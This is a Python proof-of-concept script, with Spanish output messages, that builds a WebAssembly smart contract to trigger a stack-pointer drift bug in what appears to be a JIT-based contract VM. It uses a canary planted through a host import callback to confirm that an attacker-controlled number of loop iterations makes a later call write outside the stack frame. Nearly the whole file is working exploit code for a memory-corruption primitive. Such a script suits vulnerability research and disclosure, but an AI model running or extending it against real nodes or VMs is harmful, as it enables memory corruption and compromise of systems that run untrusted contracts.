#!/usr/bin/env python3
"""
Silent wild write: proof that the leaked stack drift writes outside the frame.

When the leaking loop contains no call, nothing touches the native stack, so
the drift is completely silent: the contract finishes successfully with a
stack pointer that is thousands of bytes below where the compiler expected
it.  The *next* stack write (a call) then lands far below the wasm stack.

This script proves it with a canary:

  1. the contract calls the host import `db_read` before the leaking loop;
     the host callback (which runs on the same native stack the JIT code
     uses) plants a magic pattern over the whole mapped range below its own
     frame, down to the depth the drift is expected to reach;
  2. the contract runs the leaking loop;
  3. the contract calls the host import again; the callback re-reads the range
     and reports every slot that changed.

A changed slot outside the contract's own frame is a wild write: the
attacker chose its address (through the number of iterations) and its value
(the return address / saved registers the call sequence writes).
"""
import ctypes
import os
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import run_poc as R                                     # noqa: E402
from wasm_builder import (                              # noqa: E402
    Module, I32, I64, op_i32_const, op_i64_const, op_nop, op_end, op_if,
    op_drop, op_local_get, op_local_set, op_local_tee, op_i32_sub, op_loop,
    op_br_if, op_call, op_i32_store, op_i32_add, op_global_get, op_global_set,
)

SP = ctypes.CDLL(os.path.join(HERE, "libsp.so"))
SP.sp_probe.restype = ctypes.c_void_p

MAGIC = 0x5A5A5A5A5A5A5A5A
SLOTS = 8192            # 64 KiB of canary
DEPTH_SLOTS = 16384     # how far below the frame to arm the canary


def _maps_raw():
    out = []
    with open("/proc/self/maps") as fh:
        for line in fh:
            parts = line.split()
            rng = parts[0].split("-")
            out.append((int(rng[0], 16), int(rng[1], 16), line.strip()))
    return out


def mapped_ranges():
    out = []
    with open("/proc/self/maps") as fh:
        for line in fh:
            parts = line.split()
            rng = parts[0].split("-")
            lo, hi = int(rng[0], 16), int(rng[1], 16)
            perms = parts[1]
            if "w" in perms:
                out.append((lo, hi))
    return out


def build(iterations, ifs_per_iter=1, prefix=4):
    m = Module()
    m.add_memory(4, export="memory")
    t_pass = m.add_type([I64], [I64])
    db_read = m.add_import("env", "db_read", [I32], [I32])
    m.add_data(16, (64).to_bytes(4, "little") + (4).to_bytes(4, "little")
               + (4).to_bytes(4, "little"))
    m.add_data(2048, (2048).to_bytes(4, "little") + (16).to_bytes(4, "little")
               + (0).to_bytes(4, "little"))
    probe = m.add_func([], [], body=op_i32_const(2048) + op_call(db_read) + op_drop())

    b = bytearray()
    b += op_call(probe)                     # (1) arm the canary
    b += op_i32_const(iterations) + op_local_set(1)
    b += op_loop()
    for _ in range(ifs_per_iter):
        b += op_local_get(0) * prefix
        b += op_local_get(0)
        b += op_i32_const(0)
        b += op_if(t_pass) + op_drop() + op_i64_const(42) + op_end()
        b += op_drop() * (prefix + 1)
    b += op_local_get(1) + op_i32_const(1) + op_i32_sub() + op_local_tee(1) + op_br_if(0)
    b += op_end()
    b += op_call(probe)                     # (3) verify the canary

    fn = m.add_func([], [], locals=[I64, I32], body=bytes(b))
    m.add_func([I32, I32, I32], [I32], body=op_call(fn) + op_i32_const(16),
               export="execute")
    m.add_func([I32, I32, I32], [I32], body=op_i32_const(16), export="instantiate")
    m.add_func([], [], body=op_nop(), export="interface_version_8")
    g_bump = m.add_global(I32, True, op_i32_const(1024))
    g_region = m.add_global(I32, True, op_i32_const(128))
    alloc = (
        op_global_get(g_region) + op_local_set(1)
        + op_local_get(1) + op_global_get(g_bump) + op_i32_store()
        + op_local_get(1) + op_i32_const(4) + op_i32_add() + op_local_get(0) + op_i32_store()
        + op_local_get(1) + op_i32_const(8) + op_i32_add() + op_i32_const(0) + op_i32_store()
        + op_global_get(g_bump) + op_local_get(0) + op_i32_add() + op_global_set(g_bump)
        + op_global_get(g_region) + op_i32_const(12) + op_i32_add() + op_global_set(g_region)
        + op_local_get(1)
    )
    m.add_func([I32], [I32], locals=[I32], body=alloc, export="allocate")
    m.add_func([I32], [], body=op_nop(), export="deallocate")
    return m.build()


class ProbeVM(R.VM):
    def __init__(self, *a, **kw):
        self.armed = []          # list of (addr, nslots)
        self.expected_iters = 0
        self.maps = []
        self.frames = []
        self.changed = []
        super().__init__(*a, **kw)

    def _make_db(self):
        vm = self

        def read_db(db, gas_meter, gas_used, key, value_out, err_out):
            frame = SP.sp_probe()
            vm.frames.append(frame)
            if not vm.maps:
                vm.maps = [(lo, hi, line) for lo, hi, line in
                           [(a, b, l) for a, b, l in _maps_raw()]]
            if not vm.armed:
                # arma el canario exactamente donde la llamada desviada va a
                # escribir: `drift` bytes por debajo de este frame
                drift = 8 * vm.expected_iters
                centre = (frame - drift) & ~7
                win = 16                                   # slots (128 B)
                start = centre - win * 8
                n = win * 2
                ranges = mapped_ranges()
                for lo, hi in ranges:
                    if lo <= start and start + n * 8 <= hi:
                        buf = (ctypes.c_uint64 * n)()
                        for i in range(n):
                            buf[i] = MAGIC
                        ctypes.memmove(ctypes.c_void_p(start), buf, n * 8)
                        vm.armed.append((start, n))
                        break
            else:
                changed = []
                for start, n in vm.armed:
                    buf = (ctypes.c_uint64 * n)()
                    ctypes.memmove(buf, ctypes.c_void_p(start), n * 8)
                    for i in range(n):
                        if buf[i] != MAGIC:
                            changed.append(start + i * 8)
                vm.changed = changed
            region = (ctypes.c_uint32 * 3)(2048, 16, 0)
            vm._region_buf = region
            value_out[0] = vm._new_vec(False, ctypes.cast(region, ctypes.c_void_p), 12)
            return 0

        vt = R.DbVtable()
        vt.read_db = R.DbRead(read_db)
        vt.write_db = R.DbWrite(lambda *a: 0)
        vt.remove_db = R.DbRemove(lambda *a: 0)
        vt.scan_db = R.DbScan(lambda *a: 0)
        self._keep = [vt.read_db, vt.write_db, vt.remove_db, vt.scan_db]
        db = R.Db()
        db.gas_meter = None
        db.state = None
        db.vtable = vt
        return db


def run(iterations, ifs_per_iter=1):
    wasm = build(iterations, ifs_per_iter)
    base = tempfile.mkdtemp()
    vm = ProbeVM()
    vm.expected_iters = iterations
    cache = vm.init_cache(base)
    checksum = vm.store_code(cache, wasm, checked=True)
    vm.instantiate(cache, checksum, 1 << 62)
    res, rep, err = vm.execute(cache, checksum, 1 << 62)
    return vm, vm._vec_str(err)


def main():
    print("Escritura fuera del frame por la deriva silenciosa de pila")
    print("=" * 92, flush=True)
    print("%-12s %-8s %-24s %-24s %s"
          % ("iteraciones", "estado", "frame host 1", "frame host 2", "slots alterados"), flush=True)
    print("-" * 92)
    for iters in (0, 1000, 10000, 50000, 100000, 130000):
        vm, err = run(iters)
        if err:
            print("%-12d %-8s %s" % (iters, "ERROR", err.replace("\n", " ")[:50]))
            continue
        f = vm.frames
        drift = (f[0] - f[1]) if len(f) >= 2 else 0
        print("%-12d %-8s %-24s %-24s %s"
              % (iters, "ok", hex(f[0]) if f else "-",
                 hex(f[1]) if len(f) > 1 else "-",
                 ("deriva %d B" % drift) if len(f) >= 2 else ""))
        if len(f) >= 2:
            target = f[1] - 8
            print("            frame2 - 8 = %s  (destino de la escritura)" % hex(target))
            for lo, hi, line in vm.maps:
                if lo <= target < hi:
                    print("               %s" % line)
                    print("               -> la escritura cae en memoria mapeada")
        if vm.changed:
            print("            CANARIO ALTERADO en %d slots: %s .. %s"
                  % (len(vm.changed), hex(min(vm.changed)), hex(max(vm.changed))))
            print("            -> ESCRITURA FUERA DEL FRAME CONFIRMADA")


if __name__ == "__main__":
    main()
